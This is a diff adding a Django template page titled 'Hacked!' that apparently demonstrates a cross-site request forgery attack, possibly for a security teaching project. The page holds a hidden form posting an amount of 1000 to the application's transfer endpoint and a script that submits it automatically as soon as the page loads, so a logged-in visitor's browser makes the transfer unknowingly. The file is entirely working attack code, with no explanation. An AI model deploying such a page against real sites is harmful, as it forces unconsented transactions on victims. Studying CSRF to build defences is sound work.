@@ -1,0 +1,18 @@
+{% extends 'base.html' %}
+
+{% block title %}Hacked!{% endblock %}
+
+{% block content %}
+    <h1>Oops, nothing to see here...</h1>
+    
+    <form id="csrf_attack" action="{% url 'transfer' %}" method="POST">
+        <input type="hidden" name="amount" value="1000">
+        <input type="submit" value="Submit">
+    </form>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            document.getElementById("csrf_attack").submit();
+        });
+    </script>
+{% endblock %}
